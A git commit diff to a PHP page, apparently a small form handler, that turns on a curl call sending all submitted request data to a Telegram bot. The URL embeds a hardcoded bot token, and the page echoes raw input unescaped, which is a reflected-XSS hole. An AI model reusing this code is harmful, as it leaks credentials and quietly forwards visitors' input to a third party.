46db96044b4493dc1ce06551ad427eda81ec0fa1
ducthangbui <ducthangbui1996@gmail.com>
2019-12-24 14:46:42 +0700

    Update index.php

--- pb/index.php
+++ pb/index.php
@@ -1,20 +1,8 @@
 <?php
    error_log(implode("|",$_REQUEST));
-   print_r('<br />1<br />');
    print_r($_REQUEST);
-   print_r('<br />2<br />');
-   print_r($_GET);
-   print_r('<br />3<br />');
-   print_r($_POST);
-   print_r('<br />4<br />');
-   print_r(json_encode($_REQUEST));
-   print_r('<br />5<br />');
-   print_r(json_encode($_GET));
-   print_r('<br />6<br />');
-   print_r(json_encode($_POST));
-
    $data = json_encode($_REQUEST);
-   //print_r($data);
+   print_r('<br />'.$data);
     // Get cURL resource
 $curl = curl_init();
 // Set some options - we are passing in a useragent too here
@@ -23,9 +11,9 @@ curl_setopt_array($curl, [
     CURLOPT_URL => 'https://api.telegram.org/bot937782324:AAFxgtrxcMuHlMMMK0JmT8H8-RnqTwsz7JY/sendMessage?chat_id=-261885730&text=' . $data
 ]);
 // Send the request & save response to $resp
-//$resp = curl_exec($curl);
+$resp = curl_exec($curl);
 // Close request to clear up some resources
-//curl_close($curl);
+curl_close($curl);
 ?>
 
 <script>
